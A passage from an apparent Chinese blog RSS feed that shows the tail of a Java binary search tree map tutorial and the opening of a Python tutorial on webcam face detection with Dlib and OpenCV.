            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回之前的value&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点不存在于当前容器&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; parent =&lt;span&gt; targetEntryNode.parent;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition ==&lt;span&gt; RelativePosition.LEFT){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点位于左边&lt;/span&gt;
                parent.left = &lt;span&gt;new&lt;/span&gt; EntryNode&amp;lt;&amp;gt;&lt;span&gt;(key,value,parent);
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点位于右边&lt;/span&gt;
                parent.right = &lt;span&gt;new&lt;/span&gt; EntryNode&amp;lt;&amp;gt;&lt;span&gt;(key,value,parent);
            }

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.size++&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V remove(K key) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::查询目标节点&lt;/span&gt;
        TargetEntryNode&amp;lt;K,V&amp;gt; targetEntryNode =&lt;span&gt; getTargetEntryNode(key);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition !=&lt;span&gt; RelativePosition.CURRENT){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::没有找到目标节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::找到了目标节点

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::从二叉树中删除目标节点&lt;/span&gt;
&lt;span&gt;            deleteEntryNode(targetEntryNode.target);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; targetEntryNode.target.value;
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V get(K key) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::查询目标节点&lt;/span&gt;
        TargetEntryNode&amp;lt;K,V&amp;gt; targetEntryNode =&lt;span&gt; getTargetEntryNode(key);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition !=&lt;span&gt; RelativePosition.CURRENT){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::没有找到目标节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; targetEntryNode.target.value;
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsKey(K key) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (get(key) != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsValue(V value) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::寻找到第一个节点&lt;/span&gt;
        EntryNode&amp;lt;K,V&amp;gt; entryNode =&lt;span&gt; getFirstNode();

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::从第一个节点开始，遍历整颗二叉搜索树&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(entryNode != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(Objects.equals(entryNode.value,value)){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前节点value匹配，返回true&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::指向下一个直接后继节点&lt;/span&gt;
                entryNode =&lt;span&gt; getSuccessor(entryNode);
            }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::遍历整颗树之后，还未匹配，返回false&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.size;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isEmpty() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.size == 0&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.size = 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.root = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Iterator&amp;lt;Map.EntryNode&amp;lt;K, V&amp;gt;&amp;gt;&lt;span&gt; iterator() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Itr();
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String toString(){
        Iterator&lt;/span&gt;&amp;lt;Map.EntryNode&amp;lt;K,V&amp;gt;&amp;gt; iterator = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.iterator();

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::空容器&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;iterator.hasNext()){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;[]&quot;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::容器起始使用&quot;[&quot;&lt;/span&gt;
        StringBuilder s = &lt;span&gt;new&lt;/span&gt; StringBuilder(&quot;[&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::反复迭代&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::获得迭代的当前元素&lt;/span&gt;
            Map.EntryNode&amp;lt;K,V&amp;gt; data =&lt;span&gt; iterator.next();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前元素是否是最后一个元素&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;iterator.hasNext()){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::是最后一个元素，用&quot;]&quot;收尾&lt;/span&gt;
                s.append(data).append(&quot;]&quot;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回 拼接完毕的字符串&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt; s.toString();
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::不是最后一个元素
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::使用&quot;, &quot;分割，拼接到后面&lt;/span&gt;
                s.append(data).append(&quot;, &quot;&lt;span&gt;);
            }
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得key对应的目标节点
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   对应的key
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      对应的目标节点
     *               返回null代表 目标节点不存在
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; TargetEntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; getTargetEntryNode(K key){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; compareResult = 0&lt;span&gt;;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; parent = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; currentNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.root;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(currentNode != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            parent &lt;/span&gt;=&lt;span&gt; currentNode;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前key 和 currentNode.key进行比较&lt;/span&gt;
            compareResult =&lt;span&gt; compare(key,currentNode.key);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(compareResult &amp;gt; 0&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前key 大于currentNode 指向右边节点&lt;/span&gt;
                currentNode =&lt;span&gt; currentNode.right;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(compareResult &amp;lt; 0&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前key 小于currentNode 指向右边节点&lt;/span&gt;
                currentNode =&lt;span&gt; currentNode.left;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; TargetEntryNode&amp;lt;&amp;gt;&lt;span&gt;(currentNode, parent, RelativePosition.CURRENT);
            }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::没有找到目标节点&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(compareResult &amp;gt; 0&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回 右孩子 哨兵节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; TargetEntryNode&amp;lt;&amp;gt;(&lt;span&gt;null&lt;/span&gt;&lt;span&gt;, parent, RelativePosition.RIGHT);
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(compareResult &amp;lt; 0&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回 左孩子 哨兵节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; TargetEntryNode&amp;lt;&amp;gt;(&lt;span&gt;null&lt;/span&gt;&lt;span&gt;, parent, RelativePosition.LEFT);
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;状态异常&quot;&lt;span&gt;);
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * key值进行比较
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @SuppressWarnings(&lt;/span&gt;&quot;unchecked&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(K k1,K k2){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::迭代器不存在&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.comparator == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::依赖对象本身的 Comparable，可能会转型失败&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; ((Comparable) k1).compareTo(k2);
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::通过迭代器逻辑进行比较&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.comparator.compare(k1,k2);
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 将目标节点从二叉搜索树中删除
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; target 需要被删除的节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; deleteEntryNode(EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; target){
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
         * 删除二叉搜索树节点
         *     1.无左右孩子
         *         直接删除
         *     2.只有左孩子或者右孩子
         *         将唯一的孩子和parent节点直接相连
         *     3.既有左孩子，又有右孩子
         *         找到自己的直接前驱/后继（左侧的最右节点/右侧的最左节点）
         *         将自己和直接后继进行交换，转换为第1或第2种情况，并将自己删除
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::size自减1&lt;/span&gt;
        &lt;span&gt;this&lt;/span&gt;.size--&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::既有左孩子，又有右孩子&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(target.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; target.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::找到直接后继(右侧的最左节点)&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; targetSuccessor =&lt;span&gt; getSuccessor(target);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::target的key/value和自己的后继交换&lt;/span&gt;
            target.key =&lt;span&gt; targetSuccessor.key;
            target.value &lt;/span&gt;=&lt;span&gt; targetSuccessor.value;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::target指向自己的后继，转换为第一/第二种情况&lt;/span&gt;
            target =&lt;span&gt; targetSuccessor;
        }

        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; parent =&lt;span&gt; target.parent;
        RelativePosition relativePosition &lt;/span&gt;=&lt;span&gt; getRelativeByParent(parent,target);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::获得代替被删除节点原先位置的节点(从左右孩子中选择一个)&lt;/span&gt;
        EntryNode&amp;lt;K,V&amp;gt; replacement = (target.left != &lt;span&gt;null&lt;/span&gt; ?&lt;span&gt; target.left : target.right);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(replacement == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::无左右孩子

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::直接删除,断开和双亲节点的联系&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(relativePosition ==&lt;span&gt; RelativePosition.LEFT){
                parent.left &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                parent.right &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }

            target.parent &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::只有左孩子或者右孩子&lt;/span&gt;
            replacement.parent =&lt;span&gt; target.parent;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::被删除节点的双亲节点指向被代替的节点&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(relativePosition ==&lt;span&gt; RelativePosition.LEFT){
                parent.left &lt;/span&gt;=&lt;span&gt; replacement;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                parent.right &lt;/span&gt;=&lt;span&gt; replacement;
            }
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 判断双亲节点和目标节点 相对位置
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; parent    双亲节点
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; target    目标节点
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;          相对位置(左孩子/右孩子)
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; RelativePosition getRelativeByParent(EntryNode&amp;lt;K,V&amp;gt; parent,EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; target){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(parent.left ==&lt;span&gt; target){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; RelativePosition.LEFT;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(parent.right ==&lt;span&gt; target){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; RelativePosition.RIGHT;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;不是父子节点关系&quot;&lt;span&gt;);
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得当前节点的直接后继
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; targetEntryNode     当前节点
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;              当前节点的直接后继
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt; getSuccessor(EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; targetEntryNode){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前节点为null，则后继也为null&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前节点是否存在右孩子&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(targetEntryNode.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::存在右孩子，右子树的最左节点为直接后继&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; rightChildSuccessor =&lt;span&gt; targetEntryNode.right;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::循环往复，直至直接右孩子的最左节点&lt;/span&gt;
            &lt;span&gt;while&lt;/span&gt;(rightChildSuccessor.left != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
                rightChildSuccessor &lt;/span&gt;=&lt;span&gt; rightChildSuccessor.left;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; rightChildSuccessor;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::不存在右孩子，寻找第一个靠右的双亲节点&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; parent =&lt;span&gt; targetEntryNode.parent;
            EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; child =&lt;span&gt; targetEntryNode;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前孩子节点是否是双亲节点的左孩子&lt;/span&gt;
            &lt;span&gt;while&lt;/span&gt;(parent != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; parent.right ==&lt;span&gt; child){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::不是左孩子，是右孩子，继续向上寻找&lt;/span&gt;
                child =&lt;span&gt; parent;
                parent &lt;/span&gt;=&lt;span&gt; parent.parent;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; parent;
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得二叉搜索树的第一个节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; getFirstNode(){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::空树，返回null&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; entryNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.root;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::循环往复，寻找整棵树的最左节点(最小节点、第一个节点)&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(entryNode.left != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            entryNode &lt;/span&gt;=&lt;span&gt; entryNode.left;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; entryNode;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　我们已经实现了一个二叉搜索树，遗憾的是，实现的并不是更强大的平衡二叉搜索树。&lt;/p&gt;
&lt;p&gt;　　平衡二叉搜索树的实现远比普通二叉搜索树复杂，难理解。但凡事不能一蹴而就，要想理解更复杂的平衡二叉搜索树，理解普通的、非平衡的二叉搜索树是基础的一步。希望大家能更好的理解二叉搜索树，更好的理解自己所使用的数据结构，写出更高效，易维护的程序。&lt;/p&gt;
&lt;p&gt;　　本系列博客的代码在我的 github上：&lt;a href=&quot;https://github.com/1399852153/DataStructures&quot; target=&quot;_blank&quot;&gt;https://github.com/1399852153/DataStructures&lt;/a&gt;&lt;a href=&quot;https://github.com/1399852153/DataStructures&quot; target=&quot;_blank&quot;&gt; &lt;/a&gt;，存在许多不足之处，请多多指教。&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 14:40:00 +0000</pubDate>
<dc:creator>小熊餐馆</dc:creator>
<og:description>1.二叉搜索树介绍 前面我们已经介绍过了向量和链表。有序向量可以以二分查找的方式高效的查找特定元素，而缺点是插入删除的效率较低(需要整体移动内部元素)；链表的优点在于插入，删除元素时效率较高，但由于不</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiaoxiongcanguan/p/10277762.html</dc:identifier>
</item>
<item>
<title>Python 3 利用 Dlib 实现摄像头实时人脸检测和平铺显示 - coneypo</title>
<link>http://www.cnblogs.com/AdaminXie/p/10317066.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/AdaminXie/p/10317066.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 引言&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在某些场景下，我们不仅需要进行实时人脸检测追踪，还要进行再加工；这里进行摄像头实时人脸检测，并对于实时检测的人脸进行初步提取；&lt;/p&gt;
&lt;p&gt;　　单个/多个人脸检测，并依次在摄像头窗口，实时平铺显示检测到的人脸；&lt;/p&gt;
&lt;center readability=&quot;2&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1152352/201901/1152352-20190124210330109-988231890.gif&quot; alt=&quot;&quot;/&gt;&lt;p&gt;&lt;strong&gt;图 1 动态实时检测效果图&lt;/strong&gt;&lt;/p&gt;
&lt;/center&gt;

&lt;p&gt;　　检测到的人脸矩形图像，会依次 &lt;strong&gt;平铺显示 &lt;/strong&gt;在摄像头的左上方；&lt;/p&gt;
&lt;p&gt;　　当多个人脸时候，也能够依次铺开显示；&lt;/p&gt;
&lt;p&gt;　　左上角窗口的大小会根据捕获到的人脸大小实时变化；&lt;/p&gt;
&lt;center readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1152352/201901/1152352-20190124211205100-1450166823.png&quot; alt=&quot;&quot; width=&quot;915&quot; height=&quot;343&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图 2 单个/多个人脸情况下摄像头识别显示结果&lt;/strong&gt;&lt;/p&gt;
&lt;/center&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 代码实现&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　主要分为三个部分：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.1 摄像头调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Python 中利用 OpenCv 调用摄像头的一个例子 &lt;a title=&quot;how_to_use_camera.py&quot; href=&quot;https://github.com/coneypo/Dlib_face_cut/blob/master/how_to_use_camera.py&quot; target=&quot;_blank&quot;&gt;https://github.com/coneypo/Dlib_face_cut/blob/master/how_to_use_camera.py&lt;/a&gt; :&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; OpenCv 调用摄像头&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 默认调用笔记本摄像头&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Author:   coneypo&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Blog:     http://www.cnblogs.com/AdaminXie&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; GitHub:   https://github.com/coneypo/Dlib_face_recognition_from_camera&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Mail:     coneypo@foxmail.com&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; cv2
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt; cap =&lt;span&gt; cv2.VideoCapture(0)
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; cap.set(propId, value)&lt;/span&gt;
